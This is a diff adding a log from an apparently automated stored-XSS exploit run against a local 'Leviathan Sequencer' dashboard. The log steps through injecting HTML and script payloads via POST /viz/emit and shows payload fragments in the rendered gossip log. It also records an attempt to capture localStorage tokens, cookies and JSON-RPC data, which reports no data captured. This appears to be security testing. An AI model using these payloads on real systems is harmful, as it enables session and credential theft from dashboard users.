@@ -1,0 +1,93 @@
+[2026-04-03T04:16:27.834Z] ======================================================================
+[2026-04-03T04:16:27.834Z] XSS EXPLOIT - Leviathan Sequencer Dashboard
+[2026-04-03T04:16:27.834Z] Target: http://host.docker.internal:3030
+[2026-04-03T04:16:27.835Z] ======================================================================
+[2026-04-03T04:16:27.835Z] 
+[STEP 1] Verifying target accessibility...
+[2026-04-03T04:16:27.848Z] Target reachable. Status: 200 Body: {"ok":true,"id":"viz-000014"}
+[2026-04-03T04:16:27.848Z] 
+[STEP 2] Launching Chromium browser...
+[2026-04-03T04:16:28.200Z] Navigating to http://host.docker.internal:3030...
+[2026-04-03T04:16:28.377Z] [BROWSER CONSOLE] [verbose] [DOM] Password field is not contained in a form: (More info: https://goo.gl/9p2vKq) %o
+[2026-04-03T04:16:28.381Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:28.381Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:28.382Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:28.382Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:28.382Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:28.382Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:28.382Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:30.377Z] Page loaded. Title: Leviathan Sequencer
+[2026-04-03T04:16:30.393Z] Set fake localStorage tokens for exfiltration testing
+[2026-04-03T04:16:30.393Z] 
+[STEP 3] Navigating to Gossip & Replication tab...
+[2026-04-03T04:16:31.492Z] Clicked Gossip tab
+[2026-04-03T04:16:33.491Z] Waited for SSE connection to establish
+[2026-04-03T04:16:33.491Z] 
+[STEP 4] Delivering proof-of-concept XSS payload...
+[2026-04-03T04:16:33.496Z] PoC payload sent. Status: 200 Response: {"ok":true,"id":"viz-000015"}
+[2026-04-03T04:16:34.999Z] PoC XSS executed (window._xssPoC): undefined
+[2026-04-03T04:16:34.999Z] [WARNING] PoC may not have executed yet, trying alert-based approach...
+[2026-04-03T04:16:36.001Z] 
+[STEP 5] Delivering escalation/impact payload...
+[2026-04-03T04:16:36.001Z] This payload will:
+[2026-04-03T04:16:36.001Z]   - Read localStorage for admin tokens
+[2026-04-03T04:16:36.001Z]   - Read document.cookie
+[2026-04-03T04:16:36.001Z]   - Fetch sensitive data via JSON-RPC (l2_getAllBatches)
+[2026-04-03T04:16:36.001Z]   - Store all exfiltrated data in window._xssCapture and DOM
+[2026-04-03T04:16:36.004Z] Impact payload sent. Status: 200 Response: {"ok":true,"id":"viz-000017"}
+[2026-04-03T04:16:36.004Z] Waiting for XSS payload to execute and async fetches to complete...
+[2026-04-03T04:16:36.010Z] [BROWSER CONSOLE] [error] Failed to load resource: the server responded with a status of 404 (Not Found)
+[2026-04-03T04:16:38.374Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:38.375Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:38.375Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:38.375Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:38.376Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:38.376Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:38.376Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:39.006Z]   Waiting for XSS fetch operations... attempt 1
+[2026-04-03T04:16:40.008Z]   Waiting for XSS fetch operations... attempt 2
+[2026-04-03T04:16:41.010Z]   Waiting for XSS fetch operations... attempt 3
+[2026-04-03T04:16:42.012Z]   Waiting for XSS fetch operations... attempt 4
+[2026-04-03T04:16:43.014Z]   Waiting for XSS fetch operations... attempt 5
+[2026-04-03T04:16:44.015Z]   Waiting for XSS fetch operations... attempt 6
+[2026-04-03T04:16:45.017Z]   Waiting for XSS fetch operations... attempt 7
+[2026-04-03T04:16:46.020Z]   Waiting for XSS fetch operations... attempt 8
+[2026-04-03T04:16:47.022Z]   Waiting for XSS fetch operations... attempt 9
+[2026-04-03T04:16:48.024Z]   Waiting for XSS fetch operations... attempt 10
+[2026-04-03T04:16:48.374Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:48.375Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:48.376Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:48.376Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:48.376Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:48.376Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:48.376Z] [BROWSER CONSOLE] [error] Failed to load resource: net::ERR_CONNECTION_REFUSED
+[2026-04-03T04:16:49.024Z] 
+[STEP 6] Reading exfiltrated data from browser...
+[2026-04-03T04:16:49.026Z] 
+======================================================================
+[2026-04-03T04:16:49.026Z] EXFILTRATION RESULTS:
+[2026-04-03T04:16:49.026Z] ======================================================================
+[2026-04-03T04:16:49.026Z] XSS PoC executed: undefined
+[2026-04-03T04:16:49.026Z] Capture complete: undefined
+[2026-04-03T04:16:49.026Z] XSS error: undefined
+[2026-04-03T04:16:49.027Z] No capture data available.
+[2026-04-03T04:16:49.027Z] Raw capture state: {
+  "domExfil": null
+}
+[2026-04-03T04:16:49.027Z] 
+[STEP 7] Reading gossip log DOM to confirm XSS injection...
+[2026-04-03T04:16:49.028Z] Gossip log innerHTML (first 1000 chars): <div class="event-item"><span class="event-time">04:16:36</span><span class="event-type">gossip</span><span class="event-data">malicious-peer-node → all-connected-clients | <img src="x" onerror="(function() {   try {     var exfil = {}&lt;/span&gt;&lt;/div&gt;&lt;div class=" event-item"=""><span class="event-time">04:16:34</span><span class="event-type">gossip</span><span class="event-data">attacker-node-2 → all-peers | <script>window._xssAlert=true; console.log("XSS_ALERT_EXECUT</span></div><div class="event-item"><span class="event-time">04:16:33</span><span class="event-type">gossip</span><span class="event-data">attacker-node → all-peers | <img src=x onerror="console.log('XSS_POC_EXECUTED: alert wou</span></div></script></span></span></div>
+[2026-04-03T04:16:49.069Z] 
+Screenshot saved to: /repos/zpk_care/workspace/xss_screenshot.png
+[2026-04-03T04:16:49.069Z] 
+======================================================================
+[2026-04-03T04:16:49.069Z] EXPLOIT SUMMARY
+[2026-04-03T04:16:49.069Z] ======================================================================
+[2026-04-03T04:16:49.069Z] Target: http://host.docker.internal:3030
+[2026-04-03T04:16:49.069Z] Vulnerability: Stored XSS in /viz/emit -> Gossip Log innerHTML rendering
+[2026-04-03T04:16:49.069Z] Attack vector: POST /viz/emit with type=gossip, data=<malicious HTML>
+[2026-04-03T04:16:49.069Z] Impact: Arbitrary JavaScript execution in all connected dashboard clients
+[2026-04-03T04:16:49.069Z] Confirmed XSS execution: undefined
+[2026-04-03T04:16:49.069Z] Data exfiltration: localStorage, cookies, JSON-RPC API responses
+[2026-04-03T04:16:49.069Z] Evidence file: /repos/zpk_care/workspace/xss_evidence.txt
+[2026-04-03T04:16:49.069Z] ======================================================================
